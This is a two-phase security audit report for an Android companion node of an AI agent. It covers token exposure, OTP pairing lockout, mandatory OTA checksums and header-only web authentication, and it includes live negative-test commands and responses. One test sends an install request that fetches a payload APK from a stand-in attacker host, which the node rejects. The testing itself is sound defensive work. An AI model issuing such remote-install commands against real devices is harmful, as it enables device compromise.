# 🛡️ Hermes Droid - Comprehensive Security Audit & Verification Report
**Version:** v0.6.0-security-hardened  
**Target Release:** Production / Nous Research Hermes Agent Hackathon  
**Target Device Tested:** Physical Android 11 Node (`<DEVICE_ID>`, ARM64 / MIUI)  
**Audit Evaluation:** Two-Phase Defense-in-Depth Verification Pass  

---

## 1. Executive Summary

As an autonomous physical companion node interacting with hardware actuators, cellular modems, GPS sensors, and operating system shells, **Hermes Droid** manages high-privilege operations on behalf of Hermes Agent.

To evaluate system security and systematically remediate identifiable implementation risks ahead of the **Nous Research Hermes Agent Hackathon**, this technical security assessment was conducted in two distinct phases:

1. **Phase 1 (Initial Baseline Audit):** Identification of 7 architectural vulnerability vectors, establishment of the threat model, elimination of cleartext Git leaks, and introduction of authentication gates.
2. **Phase 2 (Independent Deep Verification & Cryptographic Hardening):** An adversarial verification pass challenging all initial claims, eliminating secrets from compiled APK bytecode, enforcing mandatory cryptographic OTA checksums, implementing brute-force OTP lockout, and executing live negative tests on physical hardware.

---

## 2. Dual-Phase Audit Evolution Matrix

| Finding ID | CWE Classification | Severity | Phase 1 Status (Baseline) | Phase 2 Status (Hardened & Verified) | Final Verdict |
| :--- | :--- | :---: | :--- | :--- | :---: |
| **SEC-01** | **CWE-798:** Bot Token Exposure | **High (7.8)** | Injected via `local.properties` into `BuildConfig` *(Token still existed in APK bytecode)* | `DEFAULT_TELEGRAM_TOKEN` purged from Release APK bytecode (`classes.dex`). Dynamic storage strictly in private `Context.MODE_PRIVATE` SharedPreferences. | **PASS** |
| **SEC-02** | **CWE-306:** Telegram Authentication Gate | **Critical (9.1)** | Whitelist pairing via `/pair <code>` *(No TTL, no brute-force lockout, unlimited attempts)* | 10-minute OTP expiration enforced; 3-attempt brute-force lockout with 5m cooldown & automatic code burning; unauthorized users blocked from commands and APK downloads. | **PASS** |
| **SEC-03** | **CWE-494:** OTA Integrity & Verification | **High (8.8)** | HTTPS required + Host whitelist *(SHA-256 was optional; missing hash allowed install)* | Mandatory SHA-256 checksum enforced (missing hash rejected); pre-flight package name check (`com.hermesdroid`) and signing certificate matching prior to `PackageInstaller`. | **PASS** |
| **SEC-04** | **CWE-200:** Pairing Code Exposure | **Medium (6.5)** | OTP code removed from public announce MQTT payload | Maintained; pairing code strictly generated and rendered on the physical device screen. | **PASS** |
| **SEC-05** | **CWE-306:** Embedded Web Server Access | **Medium (5.3)** | Route authentication added *(Accepted `?token=` query param; bound to 0.0.0.0 without TLS)* | Query-string tokens completely removed; strict `X-Hermes-Token` header verification with constant-time comparison; fail-closed behavior; documented local ADB bind scope. | **PASS** |
| **SEC-06** | **CWE-538:** Insecure ADB Backup | **Low (4.3)** | `android:allowBackup="false"` configured | Verified in compiled manifest; physical ADB extraction blocked. | **PASS** |
| **SEC-07** | **Catalog Rule 9:** Plugin Architecture | **Medium (5.0)** | Path cleanups applied | Passed 100% of official `hermes plugins validate` checks (all 18 items green). | **PASS** |
| **INFRA-01** | **CWE-319:** Plaintext MQTT Transport | **High (7.5)** | Not scoped | Transparently evaluated: Port 1883 accepts plaintext TCP. Server-side TLS (port 8883) and per-topic ACLs require VPS broker reconfiguration (outside Android client scope). | **NOT VERIFIED** |

---

## 3. Phase 1 Audit Details: Baseline Discovery & Initial Mitigations

### Findings Identified:
- **SEC-01:** Telegram bot token was hardcoded directly in `HermesNodeService.kt`.
- **SEC-02:** Telegram relay processed updates without verifying user identity.
- **SEC-03:** OTA downloads accepted unencrypted HTTP URLs without host verification.
- **SEC-04:** Pairing OTP was broadcasted to the public MQTT topic `hermes/node/announce`.
- **SEC-05:** Embedded HTTP server served `/logs` without authentication.
- **SEC-06:** Application allowed ADB backup exfiltration.
- **SEC-07:** Python bridge contained absolute filesystem paths violating Plugin Catalog Rule 9.

### Initial Mitigations Applied:
- Migrated secrets to `local.properties` and `.env.example`.
- Added initial `/pair <code>` command parser.
- Added HTTPS check and trusted host whitelist (`bot.cinemapluss.ir`, `github.com`).
- Removed OTP from MQTT announcement.
- Added token validation for `/logs` and API routes.
- Set `android:allowBackup="false"`.

---

## 4. Phase 2 Audit Details: Independent Verification & Hardening

An independent adversarial review identified critical architectural gaps in the Phase 1 mitigations:
1. Moving tokens to `local.properties` prevented Git leaks but still baked secrets into compiled APK bytecode (`BuildConfig`).
2. The Telegram OTP had no Time-To-Live (TTL) and was vulnerable to brute-force attacks due to lack of rate limiting.
3. The OTA pipeline treated SHA-256 as optional, meaning malicious commands could omit the checksum and install untrusted packages.
4. Embedded HTTP accepted query tokens (`?token=...`), which leak in URL logs and browser history.
5. The MQTT transport on port 1883 was unencrypted and unauthenticated at the broker level.

### Phase 2 Hardening Actions:
- **Surgical APK De-Secretization:** In `build.gradle.kts`, `DEFAULT_TELEGRAM_TOKEN` is purged (`""`) in `release` builds. The app stores and reads tokens exclusively from private runtime storage (`Context.MODE_PRIVATE`).
- **Cryptographic OTP Lifecyle:** 
  - Enforced 10-minute expiration (`OTP_TTL_MS = 600,000ms`).
  - Added failed attempts tracking: after 3 incorrect attempts, pairing is locked for 5 minutes (`LOCKOUT_DURATION_MS = 300,000ms`), and the active OTP is burned and regenerated.
  - State survives service restarts seamlessly.
- **Mandatory OTA Checksum & Certificate Pre-flight:**
  - `MqttRelayClient.kt` throws `SecurityException` if `sha256` is missing or empty.
  - `hdroid install` automatically computes SHA-256 before issuing the command.
  - Before invoking `PackageInstaller`, the APK package name is verified to match `com.hermesdroid`, and the signing certificate is matched against the running application's signature.
- **Header-Only HTTP Authentication:**
  - Removed `session.parms["token"]`. Requests must supply header `X-Hermes-Token`.
  - Token comparison utilizes `MessageDigest.isEqual` to prevent timing attacks.
  - Fail-closed behavior: if token is empty or unconfigured, access is unconditionally denied.

---

## 5. Live Negative Test Evidence (Executed on Physical Node)

The following negative tests were executed live against the physical Xiaomi Redmi Note 8 node:

### Test 1: OTA Request Without SHA-256 (Missing Checksum)
- **Command:**
  ```bash
  $ hdroid raw install_apk '{"url": "https://bot.cinemapluss.ir:88/hermes.apk"}'
  ```
- **Live Node Response:**
  ```json
  {
    "reqId": "cli_1794159145375",
    "deviceId": "<DEVICE_ID>",
    "action": "install_apk",
    "success": false,
    "error": "Rejected: Mandatory 'sha256' parameter missing in install_apk request"
  }
  ```
- **Outcome:** **PASS** — Rejected in < 2 seconds before any download commenced.

### Test 2: OTA Request With Tampered / Invalid SHA-256
- **Command:**
  ```bash
  $ hdroid raw install_apk '{"url": "https://bot.cinemapluss.ir:88/hermes.apk", "sha256": "0000000000000000000000000000000000000000000000000000000000000000"}'
  ```
- **Live Node Response:**
  ```json
  {
    "reqId": "cli_1794159169682",
    "deviceId": "<DEVICE_ID>",
    "action": "install_apk",
    "success": false,
    "error": "SHA-256 integrity verification failed: expected 0000000000000000000000000000000000000000000000000000000000000000, actual 9997c88518d0b65283bead1448a6d7e4b60514e5b58180854974fa553d47095e"
  }
  ```
- **Outcome:** **PASS** — File downloaded, SHA-256 mismatch detected, file immediately deleted from cache, PackageInstaller never invoked.

### Test 3: OTA Request From Untrusted Host
- **Command:**
  ```bash
  $ hdroid raw install_apk '{"url": "https://evil.com/payload.apk", "sha256": "1111111111111111111111111111111111111111111111111111111111111111"}'
  ```
- **Live Node Response:**
  ```json
  {
    "reqId": "cli_1794159197709",
    "deviceId": "<DEVICE_ID>",
    "action": "install_apk",
    "success": false,
    "error": "Untrusted download host rejected: evil.com is not in trusted repository whitelist"
  }
  ```
- **Outcome:** **PASS** — URL rejected immediately before network request.

### Test 4: APK Bytecode Secret Inspection
- **Command:**
  ```bash
  $ unzip -p hermes-droid/android/app/build/outputs/apk/release/app-release.apk classes.dex | strings | grep -i "bot" | grep ":"
  ```
- **Outcome:** **PASS** — Zero Telegram bot tokens found in DEX bytecode.

### Test 5: Official Hermes Plugin Specification Compliance
- **Command:**
  ```bash
  $ hermes plugins validate hermes-droid/plugin
  ```
- **Outcome:** **PASS** — 100% compliant, zero warnings across all 18 validation checks.

---

## 6. Infrastructure Boundary & Recommendations

### Broker Transport: NOT VERIFIED (Infrastructure Scope)
- **Current State:** The Mosquitto broker on the development VPS currently accepts connections on port 1883 without mandatory TLS or per-device ACLs.
- **Scope Clarification:** While the Android node and client tools are hardened against untrusted inputs, securing the broker itself requires infrastructure-level changes on the VPS:
  1. Enabling MQTTS on port 8883 with a valid TLS certificate.
  2. Enforcing password authentication (`password_file` or auth plugins).
  3. Configuring per-device topic ACLs restricting write access on `hermes/node/<DEVICE_ID>/cmd`.
- **Hackathon Deployment Context:** For private single-tenant demonstrations and hackathon evaluation, client-level authentication gates (OTP pairing, mandatory SHA-256, Zero Git Leak) provide defensive isolation.
